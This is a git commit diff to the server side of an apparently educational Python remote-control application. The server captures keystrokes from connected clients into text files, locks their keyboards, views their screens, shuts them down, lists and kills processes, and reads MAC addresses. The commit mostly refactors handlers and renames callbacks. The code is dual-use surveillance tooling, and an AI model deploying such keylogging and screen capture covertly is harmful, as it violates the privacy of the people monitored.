6728c47908bb871884708050405fb8f9f507ac4c
Thành Quý <thanhquy1105@gmail.com>
2021-11-08 01:16:51 +0700

    update

--- server/server.py
+++ server/server.py
@@ -32,7 +32,9 @@ def recvall(conn, length):
 
 def CatchKeyboard(connection):
     def getKeyboard(): 
-        f = open(userList[cur], "a")
+        name = userList[cur].replace(":", ".")
+        name = name + ".txt"
+        f = open(name, "a")
 
         while isCatchKeyboard[cur]:
             char = connection.recv(1024).decode('utf-8')
@@ -76,6 +78,85 @@ def WatchLiveScreen(connection):
     except Exception as e:
         pass
 
+def StopWatchLiveScreen():
+    isWatching[cur] = False
+    textForWatchLiveScreen.set("Xem màn hình")
+
+def GetMacAddress(connection):
+    mac = connection.recv(1024).decode('utf-8')
+    messagebox.showinfo("Notification", "Địa chỉ MAC của " + userList[cur] + " là: " + mac)
+
+def ShowProcesses(connection):
+    def showProcess():
+        win = Toplevel()
+        win.wm_title("Processes " + userList[cur])
+        win.wm_iconbitmap('./Server.ico')
+        win.wm_geometry("500x600")
+        
+        my_frame1 = Frame(win)
+        my_scrollbar1 = Scrollbar(my_frame1,orient=VERTICAL)
+
+        my_listbox1 = Listbox(my_frame1, width=50, height=35, yscrollcommand=my_scrollbar1.set)
+        
+        curProcess = -1
+        processList = list()
+
+        def onSelect1(evt):
+            nonlocal curProcess
+            w = evt.widget
+            cur2 = w.curselection()
+            if (len(cur2)):
+                curProcess = int(cur2[0])
+
+        my_listbox1.bind('<<ListboxSelect>>', onSelect1)
+
+        my_scrollbar1.config(command=my_listbox1.yview)
+        my_scrollbar1.pack(side=RIGHT, fill=Y)
+
+        my_frame1.grid(row=0,column=0,padx=10,pady=10)
+        my_listbox1.pack()
+
+        def killProcess():
+
+            nonlocal processList
+            print(curProcess)
+            if (curProcess != -1):
+
+                id = processList[curProcess][0:10]
+                id = int(id)
+                connection.send(str.encode("killProcess"))
+                connection.send(str.encode(str(id)))
+
+                processList.pop(curProcess)
+
+                my_listbox1.delete(curProcess)                  # Clear user list
+
+                messagebox.showinfo("Notification", "Kill successfully")               
+
+        p3 = Frame(win,background='lightblue',width=30)
+        p3.grid(row=0,column=1,padx=10,pady=10,sticky=W)    
+
+        b8 = Button(p3, text="Kill", command=killProcess)
+        b8.grid(row=0, column=0,padx=10,pady=10)
+
+        b8 = Button(p3, text="Close", command=win.destroy)
+        b8.grid(row=1, column=0,padx=10,pady=10)
+
+        loop = True
+
+        while loop:
+            process = connection.recv(1024)
+            process = process.decode('utf-8')
+            if (process == "EndOfListProcess"):
+                loop = False
+                break
+            if loop == False:
+                break
+            my_listbox1.insert(END,process)
+            processList.append(process)
+            
+    start_new_thread(showProcess,())
+
 def multi_threaded_client(connection,address):
 
     add = address[0] + ':' + str(address[1])
@@ -115,83 +196,14 @@ def multi_threaded_client(connection,address):
                     WatchLiveScreen(connection)
 
                 if (message == "stopWatchLiveScreen"):
-                    isWatching[cur] = False
-                    textForWatchLiveScreen.set("Xem màn hình")
+                    StopWatchLiveScreen()
 
                 if (message == "getMacAddress"):
-                    mac = connection.recv(1024).decode('utf-8')
-                    messagebox.showinfo("Notification", "Địa chỉ MAC của " + userList[cur] + " là: " + mac)
+                    GetMacAddress(connection)
 
                 if (message == "showProcesses"):
-
-                    def showProcess():
-                        win = Toplevel()
-                        win.wm_title("Processes " + userList[cur])
-                        win.wm_iconbitmap('./Server.ico')
-                        win.wm_geometry("500x600")
-                        
-                        my_frame1 = Frame(win)
-                        my_scrollbar1 = Scrollbar(my_frame1,orient=VERTICAL)
-
-                        my_listbox1 = Listbox(my_frame1, width=50, height=35, yscrollcommand=my_scrollbar1.set)
-                        
-                        curProcess = -1
-                        processList = list()
-
-                        def onSelect1(evt):
-                            nonlocal curProcess
-                            w = evt.widget
-                            cur2 = w.curselection()
-                            if (len(cur2)):
-                                curProcess = int(cur2[0])
-
-                        my_listbox1.bind('<<ListboxSelect>>', onSelect1)
-
-                        my_scrollbar1.config(command=my_listbox1.yview)
-                        my_scrollbar1.pack(side=RIGHT, fill=Y)
-
-                        my_frame1.grid(row=0,column=0,padx=10,pady=10)
-                        my_listbox1.pack()
-
-                        def killProcess():
-
-                            nonlocal processList
-                            print(curProcess)
-                            if (curProcess != -1):
-
-                                id = processList[curProcess][0:10]
-                                id = int(id)
-                                connection.send(str.encode("killProcess"))
-                                connection.send(str.encode(str(id)))
-
-                                processList.pop(curProcess)
-
-                                my_listbox1.delete(curProcess)                  # Clear user list
-
-                                messagebox.showinfo("Notification", "Kill successfully")               
-
-                        p3 = Frame(win,background='lightblue',width=30)
-                        p3.grid(row=0,column=1,padx=10,pady=10,sticky=W)    
-
-                        b8 = Button(p3, text="Kill", command=killProcess)
-                        b8.grid(row=0, column=0,padx=10,pady=10)
-
-                        b8 = Button(p3, text="Close", command=win.destroy)
-                        b8.grid(row=1, column=0,padx=10,pady=10)
-
-                        loop = True
-
-                        while loop:
-                            process = connection.recv(1024)
-                            process = process.decode('utf-8')
-                            if (process == "EndOfListProcess"):
-                                loop = False
-                                break
-                            my_listbox1.insert(END,process)
-                            processList.append(process)
-                            
-                    start_new_thread(showProcess,())
-
+                    ShowProcesses(connection)
+                
             except:
                 pass
                        
@@ -211,7 +223,7 @@ def multi_threaded_client(connection,address):
         print('close')
         connection.close()
 
-def onCatchKeyboard():
+def onClickCatchKeyboard():
     global cur
     print(cur)
     if (cur != -1):
@@ -236,7 +248,7 @@ def onCatchKeyboard():
                 message = "EndCatchKeyboard"
                 connectionList[cur].send(str.encode(message))
 
-def onLockKeyboard():
+def onClickLockKeyboard():
     global cur
     print(cur)
     if (cur != -1):
@@ -257,7 +269,7 @@ def onLockKeyboard():
             message = "UnLockKeyboard"
             connectionList[cur].send(str.encode(message))
 
-def onWatchLiveScreen():
+def onClickWatchLiveScreen():
     global cur
     print(cur)
     if (cur != -1):
@@ -278,7 +290,7 @@ def onWatchLiveScreen():
                 message = "stopWatchLiveScreen"
                 connectionList[cur].send(str.encode(message))
 
-def onShutdown():
+def onClickShutdown():
     global cur
     print(cur)
     if (cur != -1):
@@ -288,7 +300,7 @@ def onShutdown():
             message = "shutdown"
             connectionList[cur].send(str.encode(message))
         
-def onLogout():
+def onClickLogout():
     global cur
     print(cur)
     if (cur != -1):
@@ -297,7 +309,7 @@ def onLogout():
             message = "logout"
             connectionList[cur].send(str.encode(message))
 
-def onGetMacAddress():
+def onClickGetMacAddress():
     global cur
     print(cur)
     if (cur != -1):
@@ -312,7 +324,7 @@ def onShowFolderTree():
         message = "showFolderTree"
         connectionList[cur].send(str.encode(message))
         
-def onShowProcesses():
+def onClickShowProcesses():
     global cur
     print(cur)
     if (cur != -1):
@@ -405,28 +417,28 @@ if __name__ == '__main__':
     p2 = Frame(root,background='lightblue',width=40)
     p2.grid(row=0,column=1,padx=0,pady=5,sticky=W)    
     
-    b0 = Button(p2,textvariable=textForCatch,command=onCatchKeyboard)
+    b0 = Button(p2,textvariable=textForCatch,command=onClickCatchKeyboard)
     b0.grid(row=0,column=0,padx=30,pady=14,sticky=W)
 
-    b1 = Button(p2,textvariable=textForLock,command=onLockKeyboard)
+    b1 = Button(p2,textvariable=textForLock,command=onClickLockKeyboard)
     b1.grid(row=1,column=0,padx=30,pady=14,sticky=W)
 
-    b2 = Button(p2,textvariable=textForWatchLiveScreen,command=onWatchLiveScreen)
+    b2 = Button(p2,textvariable=textForWatchLiveScreen,command=onClickWatchLiveScreen)
     b2.grid(row=2,column=0,padx=30,pady=14,sticky=W)
 
-    b3 = Button(p2,text="Shutdown",command=onShutdown)
+    b3 = Button(p2,text="Shutdown",command=onClickShutdown)
     b3.grid(row=3,column=0,padx=30,pady=14,sticky=W)
 
-    b4 = Button(p2,text="Logout",command=onLogout)
+    b4 = Button(p2,text="Logout",command=onClickLogout)
     b4.grid(row=4,column=0,padx=30,pady=14,sticky=W)
 
-    b5 = Button(p2,text="Xem MAC address",command=onGetMacAddress)
+    b5 = Button(p2,text="Xem MAC address",command=onClickGetMacAddress)
     b5.grid(row=5,column=0,padx=30,pady=14,sticky=W)
 
     b6 = Button(p2,text="Xem cây thư mục",command=onShowFolderTree)
     b6.grid(row=6,column=0,padx=30,pady=14,sticky=W)
 
-    b7 = Button(p2,text="Xem processes",command=onShowProcesses)
+    b7 = Button(p2,text="Xem processes",command=onClickShowProcesses)
     b7.grid(row=7,column=0,padx=30,pady=14,sticky=W)
     
 
